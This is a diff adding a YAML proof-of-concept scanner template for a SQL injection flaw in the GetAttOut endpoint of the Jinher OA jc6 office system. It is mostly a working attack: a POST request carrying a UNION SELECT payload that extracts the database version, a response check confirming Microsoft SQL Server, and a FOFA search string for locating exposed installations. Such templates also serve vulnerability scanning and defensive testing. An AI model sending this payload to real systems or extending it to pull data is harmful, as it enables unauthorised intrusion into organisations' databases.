@@ -1,0 +1,16 @@
+id: poc-yaml-jinher-oa-jc6-getattout-sqli
+info:
+  name: 金和OA jc6 GetAttOut SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA 协同办公管理系统
+  fofa: app="金和网络-金和OA"
+requests:
+- method: POST
+  path: /jc6/JHSoft.WCF/TEST/GetAttOut
+  data: 1' union select null,null,@@version,null,null,null--
+  expression: status_code == 200 && contains(body,"Microsoft SQL Server") && contains(body,"Windows")
+    && contains(body,"attOReason")
+variables: {}
+transport: http
